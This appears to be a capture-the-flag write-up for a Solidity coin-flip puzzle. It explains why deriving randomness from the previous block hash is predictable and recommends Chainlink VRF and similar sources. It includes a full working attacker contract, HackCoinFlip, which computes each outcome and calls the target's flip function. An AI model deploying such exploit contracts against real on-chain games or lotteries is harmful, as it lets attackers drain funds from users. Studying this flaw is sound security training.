This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

## We need to pass the guess to the flip function accurately for 10 times

```solidity
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
```

we can see that `block.number` is being used to generate a random number.
This is dangerous as anyone with access to block can exploit this situation by finding `block.number`.

The following code takes advantage of this fact and makes a guess based on the `factor` and `block.number`.

```solidity
contract HackCoinFlip {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinflip ;
    constructor(address _address) {
        coinflip = CoinFlip(_address);
    }

    function _flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);

    }
}
```

It is advised to avoid using such variables for randomness.
Instead,[Chainlink VRF](https://docs.chain.link/docs/get-a-random-number) provide a randomness function that can be used to access random values in the contract.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/).
